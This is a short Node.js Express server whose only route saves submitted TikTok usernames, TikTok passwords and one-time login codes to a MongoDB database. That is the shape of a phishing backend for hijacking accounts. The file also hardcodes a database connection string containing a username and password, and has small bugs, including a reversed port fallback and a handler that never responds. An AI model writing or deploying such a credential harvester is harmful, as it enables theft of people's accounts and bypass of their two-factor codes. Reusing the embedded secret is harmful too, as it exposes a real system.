const express=require('express')
const app=express()
port=8080 || process.env.port
const morgan=require('morgan')
const mongoose=require('mongoose')
let Schema=mongoose.Schema
const db=mongoose.connection
const dburl='mongodb+srv://victor:mammal2000@cluster0.rh6tr.mongodb.net/?retryWrites=true&w=majority'
const cors=require('cors')
const { boolean } = require('webidl-conversions')
app.use(cors())
app.use(morgan('short'))
app.use(express.urlencoded({extended:false}));
app.use(express.json());

//connecting to mongo atlas
mongoose.connect(dburl,{
    useNewUrlParser: true,
	useUnifiedTopology: true,
}).then(()=>{
    console.log('db connected')
}).catch(err=>{
    console.log(`an error occured ${err}`)
})

//schema
let details= new Schema({
    tiktokusername:String,
    tiktokpassword:String,
    otp:Number,
  
})
//model
const model=mongoose.model('tiktok',details)
//data
const create=(req,res)=>{
    const data= new model({
        tiktokusername:req.body.tiktokusername,
        tiktokpassword:req.body.tiktokpassword,
        otp:req.body.otp,
    })
    .save()
    .then(()=>{
        console.log('saved')
    })
    .catch(err =>{console.log(`an error an error ${err}`)})
  
}
//route
app.post('/submit',create)
//server
app.listen(port,()=>{
    console.log(`app running on port ${port}`)
})